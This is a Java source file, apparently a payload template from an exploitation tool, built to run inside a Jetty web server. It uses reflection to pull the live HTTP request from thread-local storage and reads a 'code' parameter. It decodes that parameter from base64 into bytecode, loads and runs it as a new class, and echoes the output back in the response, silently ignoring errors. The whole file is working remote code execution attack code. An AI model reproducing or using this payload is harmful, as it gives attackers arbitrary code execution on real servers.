package jeg.core.template.jetty;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class JettyCodeExecTpl {

    private String getReqParamName() {
        return "code";
    }

    public JettyCodeExecTpl(){
        run();
    }

    public void run(){
        try {
            Thread thread = Thread.currentThread();
            Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object threadLocals = field.get(thread);
            Class<?> threadLocalMap = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMap.getDeclaredField("table");
            tableField.setAccessible(true);
            Object table = tableField.get(threadLocals);

            Class<?> entry = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field valueField = entry.getDeclaredField("value");
            valueField.setAccessible(true);
            Object httpConnection = null;

            Object obj;
            for (int i = 0; i < Array.getLength(table); ++i) {
                obj = Array.get(table, i);
                if (obj != null) {
                    httpConnection = valueField.get(obj);
                    if (httpConnection != null && httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                        break;
                    }
                }
            }

            Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
            Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
            String code = (String) request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, getReqParamName());
            if(code != null && code != ""){
                Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                writer.write(exec(code));
                writer.flush();
                writer.close();
            }


        }catch (Exception e){
        }
    }


    private String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
